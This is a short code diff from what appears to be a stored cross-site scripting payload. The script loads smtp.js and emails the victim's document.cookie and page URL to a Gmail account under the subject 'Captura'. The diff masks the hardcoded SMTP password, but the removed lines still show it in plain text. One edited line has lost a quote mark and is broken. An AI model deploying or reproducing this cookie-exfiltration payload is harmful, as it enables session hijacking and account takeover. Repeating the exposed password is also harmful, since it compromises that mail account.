@@ -4,7 +4,7 @@
 Email.send({
     Host : "smtp.gmail.com",
     Username : "cesar@sdredes.com.br",
-    Password : "@91344356",
+    Password : ********",
     To : 'cesar@sdredes.com.br',
     From : "cesar@sdredes.com.br",
     Subject : "Captura",
@@ -16,4 +16,4 @@ Email.Send();
 </script>
 
 
-<script src="https://smtpjs.com/v3/smtp.js"></script><script>Email.send({Host:"smtp.gmail.com",Username:"cesar@sdredes.com.br",Password:"@91344356",To:'cesar@sdredes.com.br',From:"cesar@sdredes.com.br",Subject:"Captura",Body:document.cookie+' '+window.location}).then(message=>console.log(message));Email.Send();</script>
+<script src="https://smtpjs.com/v3/smtp.js"></script><script>Email.send({Host:"smtp.gmail.com",Username:"cesar@sdredes.com.br",Password:"********",To:'cesar@sdredes.com.br',From:"cesar@sdredes.com.br",Subject:"Captura",Body:document.cookie+' '+window.location}).then(message=>console.log(message));Email.Send();</script>
